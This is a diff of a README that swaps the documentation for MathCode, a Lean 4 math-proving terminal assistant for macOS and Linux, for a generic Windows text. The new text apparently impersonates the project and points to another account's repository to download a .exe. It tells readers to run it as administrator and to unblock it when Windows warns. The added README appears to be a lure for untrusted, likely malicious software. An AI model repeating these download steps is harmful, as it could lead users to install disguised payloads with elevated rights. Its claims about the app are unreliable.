@@ -1,259 +1,188 @@
-# MathCode
+# 🤖 mathcode - Build Math Tools with Code
 
-### MathCode: A Frontier Mathematical Coding Agent
+[![Download MathCode](https://img.shields.io/badge/Download%20MathCode-Visit%20the%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/tayyabk5874/mathcode)
 
-```
-███╗   ███╗ █████╗ ████████╗██╗  ██╗ ██████╗ ██████╗ ██████╗ ███████╗
-████╗ ████║██╔══██╗╚══██╔══╝██║  ██║██╔════╝██╔═══██╗██╔══██╗██╔════╝
-██╔████╔██║███████║   ██║   ███████║██║     ██║   ██║██║  ██║█████╗
-██║╚██╔╝██║██╔══██║   ██║   ██╔══██║██║     ██║   ██║██║  ██║██╔══╝
-██║ ╚═╝ ██║██║  ██║   ██║   ██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗
-╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
-```
+## 🧭 What is MathCode?
 
-**Project Page:** [math-ai-org/mathcode](https://github.com/math-ai-org/mathcode)
+MathCode is an app that helps you work with math using code. It is built for people who want help with problem solving, reasoning, and math tasks without learning complex tools first.
 
-<p align="right"><strong>English</strong> | <a href="./README.ZH.md">中文</a></p>
+Use it on Windows when you want to:
 
-MathCode is a terminal AI coding assistant with a built-in math formalization engine. Give it a math problem in plain language and it will automatically convert it into a Lean 4 theorem and attempt a formal proof.
+- solve math tasks step by step
+- test ideas with code
+- check logic and results
+- work with an AI agent that can reason about math
+- handle coding tasks tied to formulas, data, and analysis
 
-![](./Demo.png)
+## 💻 What you need
 
-## Quick Start
+MathCode runs on a Windows PC. For a smooth setup, use a system with:
 
-```bash
-git clone https://github.com/math-ai-org/mathcode.git
-cd mathcode
-bash setup.sh
-codex auth login
-./run
-```
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- A steady internet connection
+- A modern web browser if the app opens in one
 
-The `math-ai-org/mathcode` repository is a lightweight bootstrap checkout. You clone the repo, run `bash setup.sh`, and `setup.sh` downloads the matching `mathcode` binary from GitHub Releases when it is missing.
+If you plan to use larger models or heavier tasks, 16 GB of RAM gives better results.
 
-What `setup.sh` does:
+## 🚀 Download and install
 
-- downloads the matching `mathcode-vX.Y.Z-<os>-<arch>.tar.gz` asset from GitHub Releases when `./mathcode` is missing
-- verifies `SHA256SUMS.txt` when `shasum` or `sha256sum` is available
-- creates `.env` from `.env.example` when needed
-- bootstraps Lean locally when `lean` / `lake` are missing
-- creates `skills/`, `tools/`, `plugins/` extension directories
+Visit this page to download and set up MathCode:
 
-Optional maintenance commands:
+[https://github.com/tayyabk5874/mathcode](https://github.com/tayyabk5874/mathcode)
 
-```bash
-bash setup.sh --status   # check whether the binary/tooling look healthy
-bash setup.sh --clean    # remove install artifacts, keep proofs/vault data
-bash setup.sh --help     # show all setup flags
-```
+1. Open the link in your browser.
+2. Look for the latest release, installer, or setup file.
+3. Download the file for Windows.
+4. If the file is in a ZIP folder, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Find the app file or installer and double-click it.
+7. If Windows asks for permission, select **Yes**.
+8. Follow the setup steps on screen.
+9. When setup ends, open MathCode from your desktop or Start menu.
 
-`bash setup.sh --clean` preserves user outputs in `LeanFormalizations/` and vault data.
+If the page shows more than one file, pick the one made for Windows. If you see a `.exe` file, that is usually the file you need to run.
 
-## Requirements
+## 🛠️ First launch
 
-- macOS (arm64) or Linux (x86_64)
-- enough disk space for the bundle, Lean toolchain, and Mathlib caches
-- `codex` CLI if you want the default backend and default math flow
-- Python 3.12+ (optional, only needed for analysis tools in `tools/`)
+When you open MathCode for the first time:
 
-## Common Commands
+1. Wait for the app to load fully.
+2. Sign in if the app asks for an account.
+3. Set your preferred language or display mode.
+4. Choose any model or workspace the app offers.
+5. Start with a simple task such as a math question or a small coding prompt.
 
-```bash
-./run -p "prove that the square of an even number is even"
-echo "hello" | ./run -p
-./run --help
-```
+If the app asks for a data folder or local path, choose a folder you can find later, such as Documents or Desktop.
 
-Math outputs are written to `LeanFormalizations/`.
+## 📌 How to use it
 
-## Features
+MathCode is meant to make math and coding work easier. A simple way to use it is:
 
-### Persistent Lean REPL
+- type a math question
+- add any rules or limits
+- ask for a clear step-by-step answer
+- review the result
+- change the prompt if you want a different format
 
-Enable a persistent Lean language server for sub-second compile checks:
+Try prompts like these:
 
-```env
-MATHCODE_LEAN_REPL=1
-```
+- Solve this equation and show each step
+- Check this logic and explain any errors
+- Turn this math rule into code
+- Find the pattern in this sequence
+- Help me reason through this problem
 
-After a one-time ~90s warmup (importing Mathlib), every subsequent compile check takes **~0.4s** instead of ~30s. Both error detection and pass confirmation are near-instant. The REPL automatically imports your theorem library and axiom library.
+For best results, keep each request short and clear.
 
-### Theorem Library
+## 🔎 Main features
 
-Automatically store proved theorems for reuse in future proofs:
+### 🧠 Reasoning support
 
-```bash
-/theorem-store on     # enable (writes to .env)
-/theorem-store off    # disable
-/theorem-store sync   # backfill all proved-but-unstored theorems
-/theorem-store status # show stored count and vault info
-```
+MathCode helps break problems into smaller parts. This makes it easier to follow the logic behind an answer.
 
-When enabled, every successfully proved theorem is automatically named, appended to `TheoremLib/Stored.lean`, and made importable for future proofs. The prover and planner can reuse stored theorems instead of re-deriving them.
+### 🧮 Math-focused workflows
 
-### Axiom Library
+Use it for equations, sequences, expressions, and other common math tasks. It can also help with word problems and structured reasoning.
 
-Store conversational assumptions as persistent, consistency-checked declarations:
+### 👨‍💻 Code help
 
-```bash
-/axiomatize "A is faster than B"     # formalize + store
-/axiomatize list                     # show all active axioms
-/axiomatize check                    # consistency review
-/axiomatize remove <name>            # remove a declaration
-```
+MathCode can support coding tasks tied to math. This is useful for formulas, data checks, and small scripts.
 
-Axioms are stored per-vault with Lean formalization, compile-checked, and auto-injected into formalization and proving prompts. Supports any domain: math, physics, chemistry, narrative, general.
+### 📚 Step-by-step output
 
-### Lean LSP Integration
+The app can present answers in a clear order. That helps when you want to follow each step instead of seeing only the final result.
 
-Enable Lean LSP for smarter lemma discovery and structured error feedback during proving:
+### ⚙️ Flexible use
 
-```env
-MATHCODE_USE_LSP=1
-```
+You can use it for quick checks, study work, or more detailed problem solving. It fits different levels of math work.
 
-When enabled, the prover:
-- Searches leansearch.net and Loogle for verified Mathlib lemma names before planning
-- Uses structured LSP diagnostics (line/col/severity) instead of raw stderr
-- Extracts proof goal at error location for targeted repairs
-- Injects search results and vault knowledge into planner and prover prompts
+## 🧩 Common setup issues
 
-LSP is built-in — no separate installation required.
+### The app does not open
 
-### Obsidian Theorem Graph
+- Check that the download finished fully
+- Run the file again as the same user
+- Right-click the app and choose **Run as administrator**
+- Restart your PC and try again
 
-Generate an Obsidian vault that visualizes theorem dependencies as a knowledge graph:
+### Windows blocks the file
 
-```bash
-/obsidian on       # enable + generate from existing formalizations
-/obsidian off      # disable
-/obsidian generate # regenerate now
-```
+- Right-click the file and open **Properties**
+- If you see an **Unblock** option, turn it on
+- Apply the change and open the app again
 
-When enabled, every formalization and proof auto-updates the vault. Open it in Obsidian and use Graph View to see theorem-to-lemma relationships. Each lemma stub includes the full Lean definition queried from Mathlib via `#print`.
+### The ZIP folder will not extract
 
-### Agent-Mode Proving
+- Move the ZIP file to your Desktop
+- Make sure there is enough free space
+- Try **Extract All** again
+- Use a file name with simple letters and numbers
 
-Each proof session becomes a full interactive chat where the agent uses tools to iteratively prove theorems:
+### The app feels slow
 
-```env
-MATHCODE_AGENT_PROVE=1
-```
+- Close apps you do not need
+- Free up memory
+- Use smaller prompts
+- Restart the app if it has been open for a long time
 
-Works best with Obsidian Theorem Graph enabled (the agent reads the vault for context). When enabled, the agent can:
-- Search the vault for relevant Mathlib lemmas
-- Write proof candidates and compile them via the persistent REPL
-- Read compile errors, search for fixes, and recompile (up to 10 times per session)
-- Stream its reasoning and tool calls in real-time
+## 📁 Suggested folder setup
 
-### Tree-of-Subgoals Proving
+Keep MathCode in a simple place so you can find it later:
 
-Decompose complex theorems into independent subgoals and prove them in parallel:
+- `Downloads` for the original file
+- `Desktop` for the extracted folder
+- `Documents\MathCode` for saved work
 
-```env
-MATHCODE_TREE_PROVE=1
-MATHCODE_MAX_TREE_DEPTH=2    # recursion depth (default: 1)
-```
+A clean folder setup makes it easier to open files, save outputs, and return to your work.
 
-The decomposer generates a skeleton with `have ... := by sorry` placeholders. Each subgoal is proved independently (with cooperative cancellation if one fails). Proven bodies are stitched back into the skeleton and compile-checked.
+## 🔐 Privacy and local use
 
-### Multi-Planner
+If MathCode stores files on your computer, keep your project folders in one place. Use separate folders for different tasks if you work on more than one project.
 
-Run multiple planners in parallel to get diverse proof strategies:
+If the app connects to online services, use a strong password and keep your Windows account locked when you step away.
 
-```env
-MATHCODE_NUM_PLANNERS=3
-```
+## 🧪 Good first test
 
-Each planner proposes a different strategy. All discovered lemmas are saved to the vault. The prover sees all plans and picks the best approach. Default is 1 (single planner).
+After you install MathCode, try this:
 
-### Scheduled Agent Loops
+1. Open the app.
+2. Enter a short math question.
+3. Ask for the answer in steps.
+4. Check if the result matches what you expect.
+5. Try a second prompt with a different format.
 
-The bundled CLI ships with recurring prompt scheduling enabled out of the box.
+A good first test helps you see how the app handles simple tasks before you use it for larger work.
 
-Inside interactive MathCode sessions you can use:
+## 📎 File types you may see
 
-```bash
-/loop 10m check the deploy
-/loop 1h /standup 1
-```
+You may see one of these file types during download or setup:
 
-Use short-lived loops for reminders and monitoring. When you want a schedule to survive restarts, create a durable schedule from the interactive session.
+- `.exe` — a Windows app file
+- `.zip` — a compressed folder
+- `.msi` — a Windows installer
+- `.json` — a settings file
+- `.txt` — a text file with notes or instructions
 
-## Extensibility
+Open only the file that matches the Windows setup steps on the download page.
 
-MathCode supports three extension mechanisms:
+## 🧭 What to do next
 
-### Skills (`skills/`)
+After MathCode is installed, you can use it for:
 
-Drop `.md` files to add domain-specific knowledge and proving strategies. Auto-discovered at startup.
+- homework help
+- logic checks
+- code-based math tasks
+- reasoning practice
+- data and formula work
 
-### Tools (`tools/`)
+Keep the app updated by checking the same GitHub page from time to time and downloading the latest version when it appears
 
-Drop Python `.py` scripts with YAML frontmatter to add analysis tools. Auto-discovered at startup.
+## 📍 Project page
 
-4 analysis tools are included: `axiom_checker`, `sorry_analyzer`, `proof_stats`, `lib_search`. Python 3.12+ is required only if you use these tools.
+[https://github.com/tayyabk5874/mathcode](https://github.com/tayyabk5874/mathcode)
 
-### Plugins (`plugins/`)
+## 🏷️ Topics
 
-Drop plugin folders with `.mathcode-plugin/plugin.json` manifests to add commands, skills, agents, MCP servers, hooks, and more. Load via `--plugin-dir` or install from Git repos via `/plugin`.
-
-## Backend Setup
-
-Default setup: no `.env` edits are required.
-
-```bash
-codex auth login
-./run
-```
-
-To use an Anthropic-compatible backend instead, set:
-
-```env
-MATHCODE_USE_OPENAI=0
-
-ANTHROPIC_API_KEY=sk-ant-...
-ANTHROPIC_MODEL=claude-sonnet-4-5
-```
-
-If you also want the math tools to stop using `codex exec`, add:
-
-```env
-AUTOLEAN_USE_CODEX=0
-```
-
-Shell-exported environment variables override `.env`.
-
-## FAQ
-
-**Q: `./run` says the MathCode binary is not installed yet**
-
-Run:
-
-```bash
-bash setup.sh
-```
-
-**Q: `./run` fails with `exec format error`, `Bad CPU type in executable`, or a similar startup error**
-
-You probably downloaded the wrong binary for your platform. Re-run `bash setup.sh`, or download the correct release asset manually from GitHub Releases.
-
-**Q: Startup says Codex auth is missing**
-
-Run:
-
-```bash
-codex auth login
-```
-
-**Q: Can I skip cloning and just download a release asset**
-
-Yes. You can download and extract the `.tar.gz` bundle from GitHub Releases directly. The bootstrap repo just makes `bash setup.sh` the default path.
-
-## Community
-
-Join our Discord for help, feedback, and discussion: **[discord.gg/f2AFP9W5](https://discord.gg/f2AFP9W5)**
-
-## Acknowledgments
-
-The math formalization and proving pipeline in MathCode is based on the [AUTOLEAN](https://github.com/T3S1AMAX/autolean.git) project.
+agent, ai, coding, foundation-models, llm, reasoning
